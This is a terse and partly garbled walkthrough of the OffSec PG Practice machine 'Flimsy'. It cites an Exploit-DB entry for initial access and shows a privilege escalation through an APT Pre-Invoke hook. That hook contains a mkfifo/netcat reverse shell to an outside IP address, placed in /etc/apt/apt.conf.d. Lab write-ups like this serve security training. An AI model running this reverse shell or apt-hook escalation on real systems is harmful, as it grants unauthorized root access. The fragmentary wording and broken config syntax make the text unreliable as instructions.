###### tags: `Offsec` `PG Practice` `Easy` `Linux` # Flimsy
```
┌──(kali㉿kali)-[~/pgplay]
...
``` google[edb-50829](https://www.exploit-db.com/exploits/50829),downloaduse,
```
┌──(kali㉿kali)-[~/pgplay]
...
...
``` googlecan[apt updatePE](https://systemweakness.com/code-execution-with-apt-update-in-crontab-privesc-in-linux-e6d6ffa8d076)
FirstCreate`00privesc`
```
## 00privesc
#!/bin/bash

APT::Update::Pre-Invoke { "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.228 9002 >/tmp/f"}; }
``` `/etc/apt/apt.conf.d`path,
```
